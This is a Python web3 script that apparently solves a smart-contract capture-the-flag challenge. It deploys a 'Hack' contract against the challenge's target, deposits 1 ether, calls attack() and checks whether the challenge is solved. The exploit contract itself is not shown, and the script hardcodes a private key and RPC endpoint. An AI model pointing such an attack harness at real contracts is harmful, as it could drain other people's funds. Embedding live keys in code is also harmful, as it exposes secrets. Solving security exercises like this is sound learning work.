from web3 import Web3
from web3 import HTTPProvider
import solcx
import os

RPC_URL = "http://103.152.242.78:11661/9608064a-f536-4e87-ab27-b63a621c6538"
PRIVKEY = "0x5ee5cd71580138951d88fe852780d9c534efdc5cc5d249e8820dd566f6944094"
SETUP_CONTRACT_ADDR = "0xF7900cE99C7E1aa615eF9C58b88aD7acF68a3E8d"

class Account:
    def __init__(self) -> None:
        self.w3 = Web3(HTTPProvider(RPC_URL))
        self.w3.eth.default_account = self.w3.eth.account.from_key(PRIVKEY).address
        self.account_address = self.w3.eth.default_account

    def get_balance(s, addr):
        print("balance:",s.w3.eth.get_balance(addr))


class BaseContractProps:
    def __init__(self, path: str) -> None:
        file, klass = path.split(':')
        self.__file = os.path.abspath(file)
        self.path = f"{self.__file}:{klass}"
    @property
    def abi(self):
        klass = solcx.compile_files(self.__file, output_values=["abi"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]['abi']
        raise Exception("class not found")

    @property
    def bin(self):
        klass = solcx.compile_files(self.__file, output_values=["bin"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]['bin']
        raise Exception("class not found")

class BaseDeployedContract(Account, BaseContractProps):
    def __init__(self, addr, file, abi=None) -> None:
        BaseContractProps.__init__(self, file)
        Account.__init__(self)
        self.address = addr
        if abi:
            self.contract = self.w3.eth.contract(addr, abi=abi)
        else:
            self.contract = self.w3.eth.contract(addr, abi=self.abi)

class BaseUndeployedContract(Account, BaseContractProps):
    def __init__(self, path) -> None:
        BaseContractProps.__init__(self,path)
        Account.__init__(self)
        self.contract = self.w3.eth.contract(abi=self.abi, bytecode=self.bin)

    def deploy_to_target(self, target):
        tx_hash = self.contract.constructor(target).transact()
        tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
        return  BaseDeployedContract(tx_receipt.contractAddress, self.path)

class SetupContract(BaseDeployedContract):
    def __init__(self) -> None:
        super().__init__(
            addr=SETUP_CONTRACT_ADDR,
            file="./Setup.sol:Setup",
        )

    def target(self):
        return self.contract.functions.TARGET().call()

    def is_solved(s):
        result = s.contract.functions.isSolved().call()
        print("is solved:", result)

class HackContract(BaseUndeployedContract):
    def __init__(self) -> None:
        super().__init__("./Hack.sol:Hack")

if __name__ == "__main__":
    solcx.set_solc_version_pragma("0.8.23")
    setup = SetupContract()
    target = setup.target()
    hack_base = HackContract()
    hack = hack_base.deploy_to_target(target)
    
    hack.contract.functions.depo().transact({"value": hack_base.w3.to_wei(1, 'ether')})
    
    hack.contract.functions.attack().transact()
    
    setup.is_solved()